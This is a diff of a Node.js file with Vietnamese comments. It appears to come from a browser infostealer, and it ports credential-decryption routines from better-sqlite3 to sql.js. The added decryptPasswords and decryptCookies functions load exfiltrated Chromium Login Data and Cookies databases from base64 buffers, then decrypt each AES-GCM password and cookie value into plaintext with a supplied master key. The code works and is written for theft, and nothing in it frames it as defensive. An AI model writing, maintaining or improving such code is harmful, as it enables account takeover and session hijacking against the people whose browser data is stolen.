@@ -12,28 +12,66 @@ const Auth = require("./auth");
 const crypto = require("crypto");
 const fs = require("fs");
 
-// --- HÀM LOAD MODULE TỪ FILE EXE (SELF-EXTRACT) ---
-function loadBetterSqlite3() {
+const initSqlJs = require('sql.js');
+let SQL = null;
+
+// Khởi tạo thư viện ngay khi chạy
+initSqlJs().then((S) => {
+    SQL = S;
+}).catch(err => console.error("Failed to load SQL.js", err));
+
+function decryptPasswords(masterKeyB64, dbFileB64) {
+    if (!SQL) {
+        console.log("SQL.js not ready yet.");
+        return [];
+    }
+
+    let db = null;
+    const results = [];
     try {
-        if (typeof process.pkg !== 'undefined') {
-            const internalPath = path.join(__dirname, 'better_sqlite3.node');
-            const tempPath = path.join(os.tmpdir(), `better_sqlite3_${Date.now()}.node`);
-            // Copy file ra temp để Windows load được
-            if (fs.existsSync(internalPath)) {
-                fs.writeFileSync(tempPath, fs.readFileSync(internalPath));
-                return require(tempPath);
-            }
-        } 
-        return require('better-sqlite3');
-    } catch (e) {
-        console.error("[CRITICAL] Failed to load SQLite:", e.message);
-        return null;
+        const masterKey = Buffer.from(masterKeyB64, 'base64');
+        const dbBuffer = Buffer.from(dbFileB64, 'base64');
+
+        // sql.js load trực tiếp từ Buffer, không cần ghi ra file temp
+        db = new SQL.Database(dbBuffer);
+
+        // Cú pháp prepare của sql.js hơi khác một chút
+        const stmt = db.prepare("SELECT origin_url, username_value, password_value FROM logins");
+
+        while (stmt.step()) { // Duyệt từng dòng
+            const row = stmt.getAsObject(); // Lấy dữ liệu dạng object
+
+            if (!row.password_value || !row.username_value) continue;
+
+            try {
+                // sql.js trả về Uint8Array, cần chuyển về Buffer
+                const buffer = Buffer.from(row.password_value);
+
+                if (buffer.length < 31) continue;
+                const prefix = buffer.slice(0, 3).toString('utf8');
+
+                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
+                    const iv = buffer.slice(3, 15);
+                    const tag = buffer.slice(-16);
+                    const ciphertext = buffer.slice(15, buffer.length - 16);
+
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                    decipher.setAuthTag(tag);
+                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
+
+                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
+                }
+            } catch(e) {}
+        }
+        stmt.free(); // Giải phóng bộ nhớ
+        return results;
+    } catch (e) { 
+        console.log("Decrypt Error:", e.message);
+        return []; 
+    } finally {
+        if (db) db.close();
     }
 }
-
-// Khởi tạo Database
-let Database = loadBetterSqlite3();
-if (!Database) console.log("!!! WARNING: Password decryption features will NOT work.");
 
 // --- CẤU HÌNH ---
 const CFG = {
@@ -314,29 +352,38 @@ function decryptPasswords(masterKeyB64, dbFileB64) {
 }
 
 function decryptCookies(masterKeyB64, dbFileB64) {
-    if (!Database) return [];
+    if (!SQL) return [];
+
     let db = null;
-    const tempDbName = `temp_cookies_${Date.now()}.db`;
     const results = [];
     try {
         const masterKey = Buffer.from(masterKeyB64, 'base64');
-        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
-        db = new Database(tempDbName);
-        const rows = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies").all();
-        rows.forEach((row) => {
-            if (!row.encrypted_value) return;
+        const dbBuffer = Buffer.from(dbFileB64, 'base64');
+
+        db = new SQL.Database(dbBuffer);
+
+        // Query lấy Cookies
+        const stmt = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies");
+
+        while(stmt.step()) {
+            const row = stmt.getAsObject();
+            if (!row.encrypted_value) continue;
+
             try {
-                const buffer = row.encrypted_value;
+                const buffer = Buffer.from(row.encrypted_value);
                 const prefix = buffer.slice(0, 3).toString('utf8');
                 let clearText;
+
                 if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                     const iv = buffer.slice(3, 15);
                     const ciphertext = buffer.slice(15, buffer.length - 16);
                     const tag = buffer.slice(-16);
+
                     const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                     decipher.setAuthTag(tag);
                     clearText = decipher.update(ciphertext) + decipher.final('utf8');
                 }
+
                 if (clearText) {
                     results.push({
                         domain: row.host_key, name: row.name, value: clearText,
@@ -345,12 +392,12 @@ function decryptCookies(masterKeyB64, dbFileB64) {
                     });
                 }
             } catch(e) {}
-        });
+        }
+        stmt.free();
         return results;
     } catch (e) { return []; } 
     finally {
         if (db) db.close();
-        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
     }
 }
 
